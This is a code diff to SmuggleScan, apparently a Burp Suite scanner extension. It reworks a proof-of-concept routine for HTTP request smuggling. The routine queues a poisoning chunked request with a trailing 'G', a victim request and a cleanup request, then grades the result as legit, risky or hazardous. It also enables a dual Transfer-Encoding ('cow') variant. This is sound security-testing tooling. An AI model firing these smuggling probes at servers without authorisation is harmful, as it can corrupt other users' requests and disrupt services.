@@ -57,16 +57,31 @@ public class SmuggleScan extends Scan implements IScannerCheck  {
         }
     }
 
-    private void sendPoc(Resp req, IHttpService service) {
-        byte[] badMethodIfChunked = Utilities.setHeader(req.getReq().getRequest(), "Connection", "keep-alive");
+    private void sendPoc(byte[] base, IHttpService service) {
+        byte[] badMethodIfChunked = Utilities.setHeader(base, "Connection", "keep-alive");
         badMethodIfChunked = bypassContentLengthFix(makeChunked(badMethodIfChunked, 1, 0));
         SmuggleHelper helper = new SmuggleHelper(service);
         helper.queue(Utilities.helpers.bytesToString(badMethodIfChunked)+"G");
-        helper.queue(Utilities.helpers.bytesToString(makeChunked(req.getReq().getRequest(), 0, 0)));
+        byte[] victim = makeChunked(base, 0, 0);
+        helper.queue(Utilities.helpers.bytesToString(victim));
+
         List<Resp> results = helper.waitFor();
-        if (results.get(0).getInfo().getStatusCode() != results.get(1).getInfo().getStatusCode()) {
-            Utilities.out("Probably vulnerable blah");
-            report("Req smuggling confirmed", "Status:timeout", req, results.get(0), results.get(1));
+        Resp cleanup = request(service, victim);
+        short cleanupStatus = cleanup.getInfo().getStatusCode();
+        short minerStatus = results.get(0).getInfo().getStatusCode();
+        short victimStatus = results.get(1).getInfo().getStatusCode();
+
+        if (cleanupStatus == minerStatus && minerStatus == victimStatus) {
+            return;
+        }
+
+        if (cleanupStatus == minerStatus) {
+            report("Req smuggling confirmed (legit)", "code1:code1:code2", cleanup, results.get(0), results.get(1));
+        } else if (minerStatus == victimStatus) {
+            report("Req smuggling confirmed (risky)", "code1:code2:code2", cleanup, results.get(0), results.get(1));
+        }
+        else {
+            report("Req smuggling confirmed (hazardous)", "code1:code2:code3", cleanup, results.get(0), results.get(1));
         }
     }
 
@@ -92,14 +107,12 @@ public class SmuggleScan extends Scan implements IScannerCheck  {
     }
 
     public List<IScanIssue> doScan(byte[] original, IHttpService service) {
-
         if (original[0] == 'G') {
             original = Utilities.helpers.toggleRequestMethod(original);
         }
 
         original = Utilities.addOrReplaceHeader(original, "Transfer-Encoding", "foo");
         original = Utilities.setHeader(original, "Connection", "close");
-
 
         byte[] baseReq = makeChunked(original, 0, 0);
         Resp syncedResp = request(service, baseReq);
@@ -115,7 +128,7 @@ public class SmuggleScan extends Scan implements IScannerCheck  {
         if (truncatedChunk.timedOut()) {
             Utilities.log("Reporting reverse timeout technique worked");
             report("Req smuggling v1-b", "Status:timeout", syncedResp, truncatedChunk, suggestedProbe);
-            sendPoc(syncedResp, service);
+            sendPoc(original, service);
             return null;
         }
         else {
@@ -123,7 +136,8 @@ public class SmuggleScan extends Scan implements IScannerCheck  {
             Resp truncatedDualChunk = request(service, dualChunkTruncate);
             if (truncatedDualChunk.timedOut()) {
                 Utilities.log("Reverse timeout technique with dual TE header worked");
-                //sendPoc(Utilities.addOrReplaceHeader(original, "Transfer-encoding", "cow"), service);
+                // todo check this actually works
+                sendPoc(Utilities.addOrReplaceHeader(original, "Transfer-encoding", "cow"), service);
                 report("Req smuggling v2", "Status:timeout", syncedResp, truncatedDualChunk, suggestedProbe);
                 return null;
             }
@@ -157,7 +171,7 @@ public class SmuggleScan extends Scan implements IScannerCheck  {
             }
         }
 
-        sendPoc(syncedResp, service);
+        sendPoc(original, service);
         report("Req smuggling v1", "Status:BadChunkDetection:BadLengthDetected", syncedResp, badChunkResp, badLengthResp, suggestedProbe);
         return null;
     }
